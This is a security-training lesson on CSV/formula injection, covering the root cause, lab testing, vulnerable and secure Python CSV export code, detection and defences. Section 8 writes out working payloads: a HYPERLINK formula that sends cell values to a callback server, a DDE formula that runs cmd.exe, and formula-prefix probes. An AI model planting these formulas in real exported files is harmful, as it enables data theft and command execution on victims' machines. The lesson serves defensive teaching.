---
schema_version: 1
id: WEB-A05-CSV-FORMULA-INJECTION
title: "CSV/Formula Injection"
slug: csv-formula-injection
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  []
cwe:
  - CWE-1236
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# CSV/Formula Injection

> [!CAUTION]
> Only practice on systems you own or are explicitly authorized. Use synthetic data, disposable fixtures, and limit resources; do not send payloads to the Internet or real targets.

## 1. Learning Objectives

After this lesson, you can:

- Explain CSV/Formula Injection using the root cause instead of just describing the consequences.
- Identify the trust boundary, asset, actor, and conditions necessary for the vulnerability to be exploited.
- Conduct controlled testing in a local lab and distinguish expected results from false positives.
- Select the root control, implement the fix, and retest using positive, negative, and boundary cases.

## 2. Prerequisites

- Grasp the HTTP request/response flow of the CSV/Formula Injection scenario and how to apply input handling across trust boundaries.
- Distinguish between authentication, authorization, and validation.
- Be able to read code/configuration in the language or framework appearing in the example.
- Have a local lab that is isolated, with synthetic data, observable logs, and clear testing permissions.

## 3. Background Knowledge

CSV only describes text-type data; whether a cell is classified as a formula belongs to the spreadsheet program and specific version/configuration. Prefixes such as `=`, `+`, `-`, `@`, tab, or newline must be checked with the actual consumer used in the organization and should not be considered a list of universal behavior. [S2] [S3]

```python
# Normal CSV export in a Python web application
import csv
from io import StringIO

def export_users(users):
    output = StringIO()
    writer = csv.writer(output)

    # Write header row
    writer.writerow(["Name", "Email", "Phone"])

    # Write user data rows
    for user in users:
        writer.writerow([user.name, user.email, user.phone])

    return output.getvalue()

# Example output (safe data):
# Name,Email,Phone
# Alice,alice@corp.com,+84-123-456-789
```
DDE is a legacy mechanism, and calling the program depends on the version, policy, warnings, and actions of the file opener; the lesson does not use DDE as the core payload and does not infer command execution solely from formula evaluation. [S2] [S3]

## 4. Description and Root Cause

The root cause is that the application exporting data is unreliable but does not apply a data contract for the spreadsheet consumer, causing the consumer to classify that cell as a formula instead of text. The effect depends on supported functions, spreadsheet permissions/warnings, and user actions; the lesson only verifies a harmless calculation in the fixture. [S2] [S3]

> **Reference:** Technical claims in the lesson are marked with source markers; when applying in practice, refer to the version/framework being used: [S1], [S2], [S3], [S4], [S5].

## 5. Threat Model and Exploitation Conditions

- **Assets:** aggregated data cells that have been exported and a spreadsheet workstation.  
- **Actor, authentication, and role:** user role controlling the exported field; learner actively opens the file.  
- **Exploitation conditions:** cells starting with a formula symbol are interpreted by the spreadsheet rather than displaying text.  
- **Browser, proxy, framework, and version:** LibreOffice Calc pinned and VM Windows legacy dedicated to DDE; callback loopback; must save the actual image/package version along with evidence.  
- **Mandatory evidence:** along with ID correlation must link input, control decisions, and impact to the correct asset; individual status code is not sufficient. [S1]

## 6. Attack Mechanism

For csv formula injection, a cell starting with a formula symbol is interpreted by the spreadsheet instead of displaying text. A positive case must prove that the input reaches the correct sink and produces the described effect; a negative case, when native controls are enabled, should be blocked before any side effect. The conclusion only applies to the environment pinned in section 5. [S1]

## 7. Testing in an Authorized Lab

1. **Setup:** launch LibreOffice Calc pinned and VM Windows legacy specifically for DDE; callback loopback; only load aggregate data, enable application/proxy/datastore logging, and attach correlation ID.
2. **Baseline:** send a valid input of the csv formula injection use case; save raw request/response, decide on policy and asset state before the test.
3. **Input and operations:** use exactly one core payload from item 8 in the annotated context; change one variable at a time and comply with the request cap.
4. **Expected result:** only consider the vulnerable fixture as positive if logs show the "cell starting with a formula sign is interpreted by the spreadsheet instead of displaying as text" mechanism; secure fixture must block before side effects, and boundary input must fail closed.
5. **Cleanup:** delete data, markers, and logs of the csv formula injection; revoke related session/cache, revert snapshot, and confirm no remaining callback/test processes.
6. **Safety limits:** only run on loopback/`.lab.test`; do not use target, credentials, or real data; OOB/DoS/state-changing must have network/CPU/memory/request cap.

## 8. Payloads and Scope of Applicability

The probes below only apply when the behavior is compared with the correct recorded spreadsheet/version. [S2] [S3]

**Payload 1 — Data theft via HYPERLINK:**

<!-- claim-source: [S2] [S3] -->
<!-- payload-id: WEB-A05-CSV-FORMULA-INJECTION-001 -->
<!-- context: LibreOffice Calc fixture; formula is imported into one synthetic CSV cell -->
<!-- prerequisites: callback HTTP server bound to 127.0.0.1:9001; outbound network disabled; A1 and B1 contain public fixture strings only; user confirms the hyperlink once -->
<!-- encoding: UTF-8 CSV field with spreadsheet formula syntax; CSV writer must quote embedded commas or quotes -->
<!-- expected-result: after one explicit click, callback records one GET containing only the synthetic A1 and B1 values -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
=HYPERLINK("http://127.0.0.1:9001/collect?data="&A1&"_"&B1, "Open lab callback")
```
When the victim clicks, the values of cells A1 and B1 are sent to the attacker's server via URL.

**Payload 2 - legacy DDE in a disposable Windows fixture:**

<!-- claim-source: [S2] [S3] -->
<!-- payload-id: WEB-A05-CSV-FORMULA-INJECTION-002 -->
<!-- context: legacy spreadsheet fixture with DDE explicitly enabled; behavior is version-dependent -->
<!-- prerequisites: disposable Windows VM; no network; user warning/prompt behavior recorded -->
<!-- encoding: UTF-8 CSV cell; backslash is literal and caret escapes redirection for cmd.exe inside the DDE formula -->
<!-- expected-result: after explicit learner confirmation, the fixture writes only %TEMP%\\csv-lab-marker.txt -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
=cmd|'/C echo CSV_FORMULA_LAB ^> %TEMP%\csv-lab-marker.txt'!A0
```
**Payload 3 — Formula prefix characters that need to be processed:**

<!-- claim-source: [S2] [S3] -->
<!-- payload-id: WEB-A05-CSV-FORMULA-INJECTION-006 -->
<!-- context: CSV fields imported by pinned LibreOffice Calc to test formula-prefix handling -->
<!-- prerequisites: three synthetic cells only; no links, DDE or external data; document macros disabled -->
<!-- encoding: UTF-8 CSV; %0A is tested both literally and after the application's documented URL-decoding stage -->
<!-- expected-result: export policy makes each value display literally; vulnerable import classifies any evaluated case in its recorded version -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
-1+1
@SUM(1+1)
%0A=1+1
```

## 9. Vulnerable Code and Secure Code

```python
# ❌ VULNERABLE: Direct CSV export without sanitization
@app.route("/export/users")
def export_users():
    users = User.query.all()
    output = StringIO()
    writer = csv.writer(output)
    writer.writerow(["Name", "Email"])
    for u in users:
        writer.writerow([u.name, u.email])  # Dangerous: u.name could be "=cmd|..."
    return Response(output.getvalue(), mimetype="text/csv")

# ✅ SECURE: Sanitize all fields before CSV export
FORMULA_CHARS = set("=+-@\t\r\n")

def safe_csv_value(val):
    """Neutralize potential formula injection payloads"""
    s = str(val)
    if s and s[0] in FORMULA_CHARS:
        return "'" + s  # Single-quote prefix = treat as text in Excel
    return s

@app.route("/export/users")
def export_users():
    users = User.query.all()
    output = StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)  # Quote all fields
    writer.writerow(["Name", "Email"])
    for u in users:
        writer.writerow([safe_csv_value(u.name), safe_csv_value(u.email)])
    return Response(output.getvalue(), mimetype="text/csv")
```

## 10. Detection

- Log the actor/session, route or operation, related object/resource regarding CSV/Formula Injection, the policy results, and ID correlation; do not log secrets or full tokens. 
- Compare authorization/validation failure with a valid baseline and alert according to the behavior chain, not just a single payload chain. 
- Combine application telemetry, reverse proxy, and datastore to confirm whether the request has reached the sink and whether there is any impact. 
- Scanner or WAF alert is only an investigation signal; it is not the sole evidence that the vulnerability exists. [S1]

## 11. Defense

### Compulsory control

- Sequentially convert all unreliable cells into text according to the spreadsheet and the selected CSV dialect. 
- Apply the same control to all routes, operations, and equivalent processing paths; failure must stop before any side effect.

### Defense-in-depth

With CSV/Formula Injection, the measures below help reduce the blast radius or increase detection capability. Rate limit, UUID unpredictability, WAF, CSP, or general validation cannot be used as a substitute for original controls.

- **Summary**: Clean input data before exporting the CSV file by adding a safe prefix to special characters. 
- **Detailed steps**:  
  - Add the prefix `'` (single quote) in front of dangerous values — Excel will interpret it as plain text.  
  - Strictly validate input, prohibit or remove characters that start a formula (`=`, `+`, `-`, `@`).  
  - CSV quoting only protects the structure of CSV, it does not automatically invalidate the formula. Prefix/text rules must be regression-tested on all supported consumers; if needed, ensure cell type, prioritize formats with data type metadata. [S2] [S3]

## 12. Retest

- **Positive case:** with CSV/Formula Injection, the valid flow still works correctly for the allowed actor and data.  
- **Negative case:** with the same input/resource but the actor or context is not allowed, it should be denied without leaking sensitive details.  
- **Boundary case:** test empty values, edge cases, different encodings, repeated requests, expired session state, and equivalent paths/operations.  
- **Telemetry:** verify that policy decisions, application logs, proxy logs, and datastore side effects match correlation ID.  
- **Recheck:** save the minimal scenario that reproduces the old bug and prove that the fix does not depend on WAF/rate limit.

## 13. Common Mistakes

- Only check the status code or response string of CSV/Formula Injection without verifying side effects and logs. 
- Use a payload with correct syntax but wrong DBMS, browser, framework, protocol, or injection context. 
- Consider UUID, rate limit, WAF, CSP, or general input validation as fixes for a different root control. 
- Only fix one route while the same sink/policy is used in other routes. 
- Conclude that a vulnerability exists without saving the source, fixture version, and observable evidence.

## 14. Summary and Checklist

- [ ] Root cause, consequences, and exploitation techniques have been separated.  
- [ ] Actor, role/authentication, trust boundary, technology, and version are clear.  
- [ ] Payload has a unique ID, context, encoding, conditions, expected result, risk, validation, and source.  
- [ ] Code prone to errors/unsafe uses the same framework, version, and use case.  
- [ ] Mandatory controls cannot be replaced with defense-in-depth.  
- [ ] Positive, negative, boundary cases, and telemetry have been retested.  
- [ ] Sensitive technical claims have references in section 17, and all links are only in sections 16–17.  
- [ ] Cleanup completed; no secrets, real targets, Internet callbacks, or customer data remain.

## 15. Glossary

- **CSV Injection**: Injecting a harmful formula into CSV export file data.
- **DDE (Dynamic Data Exchange)**: A protocol for dynamically exchanging data between software on Windows, which can be used to run exe files.
- **Spreadsheet**: Spreadsheet software like Excel or Google Sheets.
- **Payload**: Data intended to exploit a security vulnerability.
- **Sanitize**: Transforming data according to a specific contract; with formula injection, the transformation must be verified on the target consumer/version rather than arbitrarily removing characters. [S3]

## 16. Related Lessons and Further Reading

- [Command Execution](../command-execution/) — Directly executing commands on the operating system.

## 17. References

- **[S1]** PortSwigger. https://portswigger.net/daily-swig/csv-injection — version/status: current version; accessed: 2026-07-17.
- **[S2]** OWASP. https://owasp.org/www-community/attacks/CSV_Injection — version/status: current version; accessed: 2026-07-17.
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/1236.html — version/status: current version; accessed: 2026-07-17.
- **[S4]** James Kettle. https://www.contextis.com/en/blog/comma-separated-vulnerabilities — version/status: current version; accessed: 2026-07-17.
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — version/status: current version; accessed: 2026-07-17.
